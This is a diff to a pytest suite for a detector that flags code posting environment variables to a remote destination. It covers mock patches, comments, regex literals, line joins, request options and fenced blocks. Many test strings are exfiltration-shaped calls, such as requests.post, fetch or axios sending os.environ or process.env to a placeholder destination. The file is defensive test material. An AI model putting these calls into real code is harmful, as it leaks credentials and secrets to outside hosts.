@@ -196,11 +196,12 @@ def test_shapes_that_do_not_hand_over_the_environment_stay_clear(label, text):
     assert not hits(text), label
 
 
-def test_a_mock_before_the_call_replaces_it_and_one_for_another_receiver_does_not():
-    assert not hits('patch("requests.post")\nrequests.post(url, json=dict(os.environ))')
+def test_an_active_double_replaces_the_call_and_one_for_another_receiver_does_not():
+    assert not hits('with patch("requests.post"):\n    requests.post(url, json=dict(os.environ))')
     assert not hits('with patch.object(requests, "post"):\n    requests.post(url, json=dict(os.environ))')
-    assert not hits('patch("pkg.requests.post")\nrequests.post(url, json=dict(os.environ))')
-    assert blocks('patch("httpx.post")\nrequests.post(url, json=dict(os.environ))')
+    assert not hits('requests.post = Mock()\nrequests.post(url, json=dict(os.environ))')
+    assert blocks('with patch("httpx.post"):\n    requests.post(url, json=dict(os.environ))')
+    assert blocks('with patch("pkg.requests.post"):\n    requests.post(url, json=dict(os.environ))')
 
 
 @pytest.mark.parametrize("channel", HOSTILE_CHANNELS)
@@ -281,6 +282,13 @@ def test_an_indented_block_in_prose_is_a_limit_not_a_notice():
     lacks, so a call there is judged like code."""
     text = "A comparison of the two shapes:\n    requests.post(url, json=dict(os.environ))\n"
     assert blocks(text, "message") and blocks(text, "file")
+
+
+def test_a_receiver_written_with_spaces_around_the_dot_is_a_limit():
+    """The owner of a method is read only when the dots touch. With a space, the call is read by
+    its last two names, so another receiver's ``requests.post`` is judged as the module's."""
+    assert blocks("holder . requests.post(url, json=dict(os.environ))")
+    assert not hits("holder.requests.post(url, json=dict(os.environ))")
 
 
 def test_a_validator_that_reads_the_channel_is_given_it(engine):
@@ -431,3 +439,184 @@ def test_the_message_body_of_a_node_request_is_judged_and_an_unrelated_keyword_i
 @pytest.mark.parametrize("scope", ["self", "window", "global", "globalThis"])
 def test_a_global_scope_prefix_reads_as_the_global_function(scope):
     assert blocks("%s.fetch(url, {body: JSON.stringify(process.env)})" % scope)
+
+
+# ------------------------------------------------------------------ review round 1 shapes
+
+SEND = "requests.post(destination, json=dict(os.environ))"
+
+
+def test_a_later_bare_call_is_found_after_more_notices_than_the_finding_cap_holds():
+    fenced = "~~~python\n" + (SEND + "\n") * 25 + "~~~\n"
+    for channel in NOTICE_CHANNELS:
+        found_here = hits(fenced + SEND, channel)
+        assert len(found_here) <= 20
+        assert "high" in {f["severity"] for f in found_here}, channel
+        assert {f["severity"] for f in hits(fenced, channel)} == {"low"}, channel
+
+
+@pytest.mark.parametrize("label,text", [
+    ("a_patch_that_is_built_but_not_started", 'replacement = patch("requests.post")\n' + SEND),
+    ("a_patch_block_that_has_ended", 'with patch("requests.post"):\n    pass\n' + SEND),
+    ("a_patch_of_a_longer_path", 'with patch("other.requests.post"):\n    ' + SEND),
+    ("a_decorated_function_that_has_ended", '@patch("requests.post")\ndef test():\n    pass\n' + SEND),
+    ("a_patch_object_block_that_has_ended", 'with patch.object(requests, "post"):\n    pass\n' + SEND),
+], ids=lambda v: v if isinstance(v, str) and v.startswith("a_") else "t")
+def test_a_double_that_is_not_active_at_the_call_does_not_clear_it(label, text):
+    assert blocks(text), label
+
+
+@pytest.mark.parametrize("label,text", [
+    ("with_block", 'with patch("requests.post"):\n    ' + SEND),
+    ("with_block_after_other_lines", 'x = 1\nwith patch("requests.post") as m:\n    y = 2\n    ' + SEND),
+    ("with_two_patches", 'with patch("httpx.get"), patch("requests.post"):\n    ' + SEND),
+    ("with_object", 'with patch.object(requests, "post"):\n    ' + SEND),
+    ("decorator", '@patch("requests.post")\ndef test(m):\n    ' + SEND),
+    ("started", 'patch("requests.post").start()\n' + SEND),
+    ("assignment", "requests.post = Mock()\n" + SEND),
+    ("spy", 'jest.spyOn(axios, "post")\naxios.post(u, process.env)'),
+], ids=lambda v: v if isinstance(v, str) and "_" in v and " " not in v else "t")
+def test_a_double_that_is_active_at_the_call_clears_it(label, text):
+    assert not hits(text), label
+
+
+@pytest.mark.parametrize("label,text", [
+    ("floor_division_before_the_call", "n = 8 // 2; " + SEND),
+    ("line_join_inside_the_environment_name", "requests.post(destination, json=os.\\\nenviron)"),
+    ("line_join_inside_the_client_name", "requests.\\\npost(destination, json=os.environ)"),
+    ("line_join_before_the_argument", "requests.post(destination, \\\n    json=os.environ)"),
+    ("slash_comment_alone_on_a_line_ends_there", "// note\n" + SEND),
+], ids=lambda c: c if isinstance(c, str) and " " not in c and "(" not in c else "t")
+def test_python_floor_division_and_line_joins_do_not_hide_a_call(label, text):
+    assert blocks(text), label
+
+
+@pytest.mark.parametrize("text", [
+    "// requests.post(destination, json=dict(os.environ))",
+    "    // axios.post(destination, process.env)",
+    "const r = /axios.post(destination, process.env)/;",
+    "if (/fetch(destination, process.env)/.test(s)) {}",
+])
+def test_a_comment_or_a_regular_expression_literal_is_not_a_call(text):
+    assert not hits(text), text
+
+
+def test_a_slash_that_divides_or_marks_a_positional_only_parameter_is_not_a_literal():
+    assert blocks("def f(a, /):\n    pass\n" + SEND)
+    assert blocks("n = a / b; " + SEND)
+    assert blocks("n = (a) / (b); " + SEND)
+
+
+@pytest.mark.parametrize("text", [
+    "requests.post(destination, json=len(os.environ.copy()))",
+    "requests.post(destination, json=len(os.environ.items()))",
+    "requests.post(destination, json=len(os.environ.values()))",
+    "requests.post(destination, json=list(os.environ.copy()))",
+    "requests.post(destination, json=sorted(dict(os.environ)))",
+    "requests.post(destination, json=[key for key, value in os.environ.items()])",
+    "requests.post(destination, json=[name for name, _ in os.environ.items()])",
+    "requests.post(destination, json=sorted(os.environ.copy().keys()))",
+])
+def test_names_and_counts_of_the_environment_are_not_the_environment(text):
+    assert not hits(text), text
+
+
+@pytest.mark.parametrize("text", [
+    "requests.post(destination, json=list(os.environ.items()))",
+    "requests.post(destination, json=sorted(os.environ.values()))",
+    "requests.post(destination, json=str(os.environ.copy()))",
+    "requests.post(destination, json=dict(os.environ.items()))",
+    "requests.post(destination, json=[value for key, value in os.environ.items()])",
+    "requests.post(destination, json=[(key, value) for key, value in os.environ.items()])",
+    "requests.post(destination, json=list(os.environ.copy().values()))",
+    "requests.post(destination, json=dict(os.environ.copy()))",
+])
+def test_values_and_pairs_of_the_environment_are_still_the_environment(text):
+    assert blocks(text), text
+
+
+@pytest.mark.parametrize("text", [
+    'fetch(destination, {cache: "no-store", unused: process.env})',
+    "got(destination, {context: process.env})",
+    'axios({url: "http://LOCALHOST:8080", data: process.env, method: "post"})',
+    "fetch(`http://localhost:8080`, {body: JSON.stringify(process.env)})",
+    "axios.post(destination, payload, {timeout: process.env})",
+])
+def test_an_options_property_that_carries_no_data_does_not_make_a_send(text):
+    assert not hits(text), text
+
+
+@pytest.mark.parametrize("text", [
+    "fetch(destination, {body: JSON.stringify(process.env)})",
+    "fetch(destination, {headers: process.env})",
+    "got(destination, {json: process.env})",
+    "got.post(destination, {form: process.env})",
+    'axios({url: destination, data: process.env, method: "post"})',
+    'axios({url: JSON.stringify(process.env), method: "get"})',
+    "axios.request({url: destination, params: process.env})",
+    "axios.post(destination, process.env, {})",
+    "axios.post(destination, {...process.env})",
+    "axios.post(destination, payload, {headers: process.env})",
+])
+def test_an_options_property_that_carries_data_is_judged_like_an_argument(text):
+    assert blocks(text), text
+
+
+def test_a_property_of_another_namespace_is_not_the_process_environment():
+    assert not hits("requests.post(destination, json=other.os.environ)")
+    assert not hits("fetch(destination, {body: JSON.stringify(other.process.env)})")
+    assert blocks("fetch(destination, {body: JSON.stringify(globalThis.process.env)})")
+    assert blocks("requests.post(destination, json=dict(os.environ))")
+
+
+def test_the_callee_walk_is_linear_in_a_chain_of_client_names():
+    v = validator()
+    tail = "post(destination, json=os.environ)"
+
+    def run(n):
+        text = "requests . " * n + tail
+        return best_of(lambda: v.run(text, "code") if v.pregate(text) else [])
+
+    small, large = run(800), run(6400)
+    assert large < 48 * max(small, 1e-4) + 0.2, (small, large)
+    assert blocks("requests . " * 20 + tail, "code")
+
+
+@pytest.mark.parametrize("channel", ["code"])
+@pytest.mark.parametrize("label,text,expect", [
+    ("backtick_fence_is_a_template_literal", "```python\n" + SEND + "\n```\n", False),
+    ("tilde_fence_lines_are_punctuation", "~~~python\n" + SEND + "\n~~~\n", True),
+    ("indented_backtick_fence", "   ```\n" + SEND + "\n   ```\n", False),
+    ("unclosed_backtick_fence", "```\n" + SEND + "\n", False),
+    ("long_backtick_fence", "`````\n" + SEND + "\n`````\n", False),
+    ("a_call_after_the_closed_fence", "```\nx\n```\n" + SEND, True),
+    ("info_string", "```python " + SEND + "\nx\n```\n", False),
+])
+def test_the_code_channel_is_read_as_source_and_never_split_at_fences(channel, label, text, expect):
+    severities = {f["severity"] for f in hits(text, channel)}
+    assert severities == ({"high"} if expect else set()), (label, severities)
+    # the same text as a file is split: its fenced call is a notice, never invisible
+    if label in ("backtick_fence_is_a_template_literal", "indented_backtick_fence", "long_backtick_fence"):
+        assert {f["severity"] for f in hits(text, "file")} == {"low"}
+
+
+def test_a_validator_declared_for_file_is_given_the_original_code_channel(engine):
+    seen = []
+
+    class Probe:
+        id, name, category, severity = "PROBE", "probe", "x", "low"
+        channel = ["file"]
+        description = "probe"
+        reads_channel = True
+
+        def pregate(self, text):
+            return True
+
+        def run(self, text, channel):
+            seen.append(channel)
+            return []
+
+    probe_engine = SunglassesEngine(PATTERNS)
+    probe_engine._validators = (Probe(),)
+    probe_engine.scan("hello", channel="code")
+    assert seen == ["code"]
